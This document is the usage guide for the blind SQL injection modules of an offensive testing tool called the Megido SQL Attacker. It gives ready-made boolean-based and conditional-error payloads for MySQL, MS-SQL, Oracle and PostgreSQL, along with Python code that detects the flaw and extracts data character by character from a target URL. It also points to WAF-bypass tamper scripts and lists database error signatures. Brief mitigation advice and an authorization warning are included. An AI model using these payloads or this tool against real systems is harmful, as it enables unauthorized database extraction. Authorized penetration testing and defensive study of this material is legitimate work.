# Blind SQL Injection Inference Techniques Guide

## Overview

This guide documents the implementation of two major blind SQL injection inference techniques in the Megido SQL Attacker module. These techniques enable data extraction when no out-of-band (OOB) or data-leak channels are available.

## Implemented Techniques

### 1. Behavioral Inference (Boolean-based Blind SQLi)

**Module:** `sql_attacker/boolean_blind_detector.py`

Boolean-based blind SQL injection relies on observing different application behaviors when a tested condition is true versus false. The attacker iterates over character positions and ASCII codes to reconstruct data character-by-character.

#### How It Works

1. **Baseline Establishment**: Record normal application response
2. **True/False Testing**: Inject payloads with known true/false conditions
3. **Pattern Recognition**: Identify consistent differences in responses
4. **Data Extraction**: Use character-by-character testing to extract values

#### Payload Examples

**MySQL:**
```sql
' AND ASCII(SUBSTRING((SELECT database()),1,1))=68--
' AND ASCII(SUBSTRING((SELECT database()),2,1))=97--
```

**MS-SQL:**
```sql
' AND ASCII(SUBSTRING((SELECT DB_NAME()),1,1))=68--
' AND ASCII(SUBSTRING((SELECT DB_NAME()),2,1))=97--
```

**Oracle:**
```sql
' AND ASCII(SUBSTR((SELECT user FROM dual),1,1))=68--
' AND ASCII(SUBSTR((SELECT user FROM dual),2,1))=97--
```

**PostgreSQL:**
```sql
' AND ASCII(SUBSTRING((SELECT current_database()),1,1))=68--
' AND ASCII(SUBSTRING((SELECT current_database()),2,1))=97--
```

#### Key Features

- **Content-based differentiation**: Analyzes response content, length, and status codes
- **High similarity detection**: Uses difflib to compare response patterns (default 95% threshold)
- **ASCII-based extraction**: Faster extraction using ASCII code comparison (32-126)
- **Character-based extraction**: Falls back to character comparison when needed
- **Cross-database support**: MySQL, MS-SQL, Oracle, PostgreSQL
- **Confidence scoring**: Provides confidence levels for detections

#### Usage Example

```python
from sql_attacker.boolean_blind_detector import BooleanBlindDetector

# Initialize detector
detector = BooleanBlindDetector(similarity_threshold=0.95)

# Establish baseline
baseline_response = requests.get("http://target.com/page?id=1")
detector.establish_baseline(baseline_response)

# Test for vulnerability
results = detector.test_boolean_injection(
    test_function=make_request,
    url="http://target.com/page",
    param="id",
    param_type="GET"
)

if results['vulnerable']:
    print(f"Vulnerable! Confidence: {results['confidence']}")
    
    # Extract data
    data = detector.extract_data_bit_by_bit(
        test_function=make_request,
        url="http://target.com/page",
        param="id",
        param_type="GET",
        query="database()",  # MySQL
        db_type="mysql",
        use_ascii=True  # Faster ASCII-based extraction
    )
    print(f"Extracted: {data}")
```

---

### 2. Error-based/Conditional Error Inference

**Module:** `sql_attacker/error_based_blind_detector.py`

Error-based blind SQL injection triggers deliberate errors when a tested condition is true. Errors like divide-by-zero or type conversion failures can be detected through HTTP error codes (500) or error messages in responses.

#### How It Works

1. **Baseline Establishment**: Record normal application response
2. **Conditional Error Testing**: Inject payloads that trigger errors on true conditions
3. **Error Detection**: Monitor for HTTP 500, error messages, stack traces
4. **Data Extraction**: Use errors to infer true/false and extract data

#### Payload Examples

**Oracle:**
```sql
-- Divide by zero when condition is true
(SELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE username = 'DBSNMP') = 'DBSNMP')

-- Using CASE statement
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END FROM dual)=1--

-- Type conversion error
' AND (CASE WHEN (1=1) THEN TO_NUMBER('a') ELSE 1 END)=1--
```

**MySQL:**
```sql
-- IF statement with divide by zero
AND IF((SELECT SUBSTRING(@@version,1,1))='5', (SELECT 1/0), 1)

-- Direct conditional error
' AND IF((1=1), (SELECT 1/0), 1)--

-- Double value error (advanced)
' AND IF((1=1), (SELECT 1 FROM (SELECT COUNT(*), CONCAT(@@version, 0x3a, FLOOR(RAND()*2)) AS x FROM information_schema.tables GROUP BY x) y), 1)--
```

**MS-SQL:**
```sql
-- CASE with divide by zero
AND 1=CASE WHEN (SELECT TOP 1 name FROM master..sysdatabases)='master' THEN 1/0 ELSE 1 END

-- Type conversion error
' AND 1=CASE WHEN (1=1) THEN CAST('a' AS INT) ELSE 1 END--
```

**PostgreSQL:**
```sql
-- CASE with divide by zero
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)=1--

-- Type conversion error
' AND (SELECT CASE WHEN (1=1) THEN CAST('a' AS INTEGER) ELSE 1 END)=1--
```

#### Error Indicators Detected

The module detects errors through:

**HTTP Status Codes:**
- 500 (Internal Server Error)
- 503 (Service Unavailable)

**MySQL Error Messages:**
- "You have an error in your SQL syntax"
- "Division by zero"
- "Warning: mysql_"
- "MySQLSyntaxErrorException"

**MS-SQL Error Messages:**
- "Microsoft SQL Server"
- "Divide by zero error"
- "Conversion failed"
- "Incorrect syntax near"
- "ODBC SQL Server"

**Oracle Error Messages:**
- "ORA-01476: divisor is equal to zero"
- "ORA-01722: invalid number"
- "Oracle error"
- "java.sql.SQLException: ORA-"

**PostgreSQL Error Messages:**
- "ERROR: division by zero"
- "invalid input syntax"
- "PostgreSQL query failed"
- "psycopg2.errors"

#### Key Features

- **Conditional error triggering**: Errors occur only when conditions are true
- **Multiple error types**: Divide-by-zero, type conversion, value errors
- **Cross-database support**: MySQL, MS-SQL, Oracle, PostgreSQL
- **HTTP error detection**: Monitors status codes (500, 503)
- **Content-based error detection**: Scans response content for error messages
- **Fast extraction**: Clear error/no-error distinction enables faster extraction
- **Confidence scoring**: Based on error differentiation rate

#### Usage Example

```python
from sql_attacker.error_based_blind_detector import ErrorBasedBlindDetector

# Initialize detector
detector = ErrorBasedBlindDetector(confidence_threshold=0.8)

# Establish baseline
baseline_response = requests.get("http://target.com/page?id=1")
detector.establish_baseline(baseline_response)

# Test for vulnerability
results = detector.test_conditional_error_injection(
    test_function=make_request,
    url="http://target.com/page",
    param="id",
    param_type="GET",
    db_type="mysql"
)

if results['vulnerable']:
    print(f"Vulnerable! Confidence: {results['confidence']}")
    print(f"Errors on TRUE: {results['error_on_true']}")
    print(f"No errors on FALSE: {results['no_error_on_false']}")
    
    # Extract data
    data = detector.extract_data_via_conditional_errors(
        test_function=make_request,
        url="http://target.com/page",
        param="id",
        param_type="GET",
        query="database()",  # MySQL
        db_type="mysql",
        use_ascii=True  # Use ASCII comparison (faster)
    )
    print(f"Extracted: {data}")
```

---

## Comparison of Techniques

| Aspect | Boolean-Based Blind | Error-Based Blind |
|--------|-------------------|------------------|
| **Detection Method** | Content differentiation (true vs false response) | Error/no-error detection (HTTP 500, error messages) |
| **Observable Behavior** | Different page content, different lengths | Error messages, HTTP 500, stack traces |
| **Payload Complexity** | Simple conditionals (`' AND 1=1--`) | Conditional errors (`' AND 1/0--`) |
| **Speed** | Moderate (requires content analysis) | Fast (clear error/ok distinction) |
| **Reliability** | High (if responses differ consistently) | High (if errors are displayed) |
| **Stealth** | Moderate (normal-looking queries) | Low (triggers errors in logs) |
| **WAF Evasion** | Easier (benign-looking payloads) | Harder (suspicious error patterns) |

---

## When to Use Each Technique

### Use Boolean-Based Blind When:
- ✅ Application suppresses error messages
- ✅ Need stealthy data extraction
- ✅ Responses differ consistently for true/false conditions
- ✅ Error-based detection fails

### Use Error-Based Blind When:
- ✅ Application displays detailed errors
- ✅ Need fast extraction (clear error/no-error)
- ✅ HTTP status codes change on errors
- ✅ Boolean-based differentiation is unclear

---

## Integration with SQL Attacker Engine

Both techniques are integrated into the main SQL injection engine (`sqli_engine.py`). They can be enabled via configuration:

```python
from sql_attacker.sqli_engine import SQLInjectionEngine

engine = SQLInjectionEngine()

# Full scan with blind detection
results = engine.scan_target(
    url="http://target.com/page",
    method="GET",
    params={"id": "1"},
    enable_boolean_blind=True,    # Enable boolean-based detection
    enable_error_blind=True,       # Enable error-based detection
    enable_time_based=True,        # Also enable time-based (if applicable)
)
```

---

## Testing

### Unit Tests

**Boolean-based tests:** `sql_attacker/test_boolean_blind.py`
```bash
python manage.py test sql_attacker.test_boolean_blind
```

**Error-based tests:** `sql_attacker/test_error_based_blind.py`
```bash
python manage.py test sql_attacker.test_error_based_blind
```

### Demo Script

Run the comprehensive demonstration:
```bash
python demo_blind_sqli_inference.py
```

This demonstrates:
- Boolean-based blind detection and extraction
- Error-based blind detection and extraction
- Payload examples from problem statement
- Comparison of both techniques

---

## Payload Library

The modules include comprehensive payload libraries:

### Boolean-Based Payloads
- **Numeric contexts**: `AND 1=1`, `AND 1=2`
- **String contexts**: `' AND 'a'='a`, `' AND 'a'='b`
- **Advanced contexts**: Database-specific functions
- **ASCII extraction**: `ASCII(SUBSTRING(...))={code}`
- **Character extraction**: `SUBSTRING(...)='{char}'`

### Error-Based Payloads
- **Divide-by-zero**: `SELECT 1/0`, `CASE WHEN ... THEN 1/0`
- **Type conversion**: `CAST('a' AS INT)`, `TO_NUMBER('a')`
- **Value errors**: `CONCAT()` with invalid values
- **Conditional errors**: `IF()`, `CASE WHEN` with error triggers

---

## Response Analysis

### Boolean-Based Analysis
```python
# Calculate similarity between responses
similarity = detector.calculate_similarity(pattern1, pattern2)

# Group similarity (all true responses should be similar)
true_similarity = detector._calculate_group_similarity(true_patterns)

# Cross-group similarity (true vs false should differ)
cross_similarity = detector._calculate_cross_similarity(true_patterns, false_patterns)
```

### Error-Based Analysis
```python
# Analyze response for errors
pattern = detector.analyze_response(response)

# Check error indicators
if pattern.has_error:
    print(f"Error detected: {pattern.error_indicators}")
    print(f"Status code: {pattern.status_code}")
```

---

## Automated Data Extraction

Both techniques support automated data extraction:

### Character-by-Character Extraction

1. **Determine string length** (optional optimization)
2. **Iterate positions** (1 to max_length)
3. **Test each character/ASCII code** until match found
4. **Build extracted string** incrementally

### Optimization Strategies

**ASCII Mode (Recommended):**
- Test ASCII codes 32-126 (printable characters)
- Faster than character-by-character
- ~95 tests per character vs ~62 for charset

**Binary Search (Future Enhancement):**
- Test ranges: `ASCII(...) > 64`
- Narrows down to exact value
- ~7 tests per character for ASCII range

---

## Security Considerations

### Detection Risks
- Boolean-based: May appear in logs as unusual query patterns
- Error-based: Generates errors in application logs
- Both: Generate high request volumes

### Mitigation (for Defenders)
1. **Input validation**: Sanitize all user inputs
2. **Parameterized queries**: Use prepared statements
3. **Error suppression**: Don't expose detailed errors to users
4. **Rate limiting**: Detect and block high-frequency requests
5. **WAF rules**: Block known injection patterns
6. **Monitoring**: Alert on unusual query patterns

### Ethical Usage
⚠️ **Important**: These techniques are for:
- Authorized security testing
- Educational purposes
- Vulnerability research in controlled environments

**Never** use against systems without explicit written permission.

---

## Performance Considerations

### Request Volume

**Per character extraction:**
- ASCII mode: ~95 requests (testing codes 32-126)
- Character mode: ~62 requests (testing charset)
- Binary search: ~7 requests (future optimization)

**For 10-character string:**
- ASCII mode: ~950 requests
- Character mode: ~620 requests
- With length detection: Same + ~100 requests

### Time Estimates

Assuming 100ms per request:
- 10-character string: 62-95 seconds
- 50-character string: 310-475 seconds (~5-8 minutes)
- 100-character string: 620-950 seconds (~10-16 minutes)

### Optimization Recommendations

1. **Enable ASCII mode** for faster extraction
2. **Implement binary search** to reduce requests per character
3. **Use threading/async** for parallel character testing
4. **Cache common values** (database names, table names)
5. **Implement smart length detection** to avoid testing beyond actual length

---

## Advanced Features

### Payload Obfuscation
Both modules support integration with:
- `tamper_scripts.py`: WAF bypass transformations
- `bypass_techniques.py`: Character encoding, comment injection
- `polyglot_payloads.py`: Multi-context payloads

### False Positive Reduction
- Content hash comparison
- Response length analysis
- Status code validation
- Pattern consistency checking

### Reporting
```python
# Generate detailed reports
boolean_report = boolean_detector.generate_report()
error_report = error_detector.generate_report()

print(boolean_report)
print(error_report)
```

---

## References

### Related Modules
- `boolean_blind_detector.py`: Boolean-based implementation
- `error_based_blind_detector.py`: Error-based implementation
- `sqli_engine.py`: Main SQL injection engine
- `statistical_timing.py`: Time-based blind detection (complementary)

### Documentation
- `test_boolean_blind.py`: Unit tests with examples
- `test_error_based_blind.py`: Unit tests with examples
- `demo_blind_sqli_inference.py`: Interactive demonstration
- `README.md`: Main SQL Attacker documentation

### External Resources
- OWASP Testing Guide: Blind SQL Injection
- SQLMAP Documentation
- PortSwigger Web Security Academy: Blind SQL Injection

---

## Future Enhancements

### Planned Features
- [ ] Binary search optimization for faster extraction
- [ ] Threading/async support for parallel testing
- [ ] Automatic database type detection
- [ ] Smart charset detection based on context
- [ ] Integration with ML-based payload optimization
- [ ] Enhanced WAF evasion techniques

### Contribution
To contribute improvements:
1. Add tests in `test_boolean_blind.py` or `test_error_based_blind.py`
2. Update payload libraries in the detector modules
3. Document new techniques in this guide
4. Submit pull requests with clear descriptions

---

## Summary

The Megido SQL Attacker now supports comprehensive blind SQL injection inference:

✅ **Boolean-Based Blind SQLi**
- Behavioral inference via content differentiation
- ASCII and character extraction modes
- Cross-database support (MySQL, MS-SQL, Oracle, PostgreSQL)

✅ **Error-Based/Conditional Error Blind SQLi**
- Conditional error triggering (divide-by-zero, type errors)
- HTTP status and content-based error detection
- Cross-database support (MySQL, MS-SQL, Oracle, PostgreSQL)

✅ **Automated Extraction**
- Character-by-character data reconstruction
- Configurable extraction strategies
- High confidence scoring

✅ **Production Ready**
- Comprehensive unit tests
- Interactive demonstrations
- Detailed documentation
- Integration with main engine

These techniques enable data extraction when no OOB or data-leak channels are available, completing the blind SQL injection capability set.
